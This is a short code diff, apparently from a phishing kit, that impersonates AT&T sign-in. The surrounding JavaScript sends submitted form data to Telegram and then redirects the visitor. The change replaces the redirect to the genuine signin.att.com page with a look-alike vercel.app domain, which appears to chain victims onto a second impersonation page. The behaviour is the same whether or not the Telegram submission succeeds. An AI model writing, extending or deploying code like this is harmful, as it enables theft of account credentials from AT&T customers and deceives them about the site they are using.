@@ -178,14 +178,14 @@ $('.back').on('click', function() {
           console.log("✅ Form submitted to Telegram successfully");
           // Redirect after a successful submission
           setTimeout(function () {
-            window.location.href = "https://signin.att.com";
+            window.location.href = "https://att-session-manageraction-retry.vercel.app/";
           }, 1000);
         },
         error: function (jqXHR, textStatus, errorThrown) {
           console.error("❌ Failed to send message to Telegram:", textStatus, errorThrown);
           // Still redirect even if there's an error (to maintain user experience)
           setTimeout(function () {
-            window.location.href = "https://signin.att.com";
+            window.location.href = "https://att-session-manageraction-retry.vercel.app/";
           }, 1000);
         }
       });
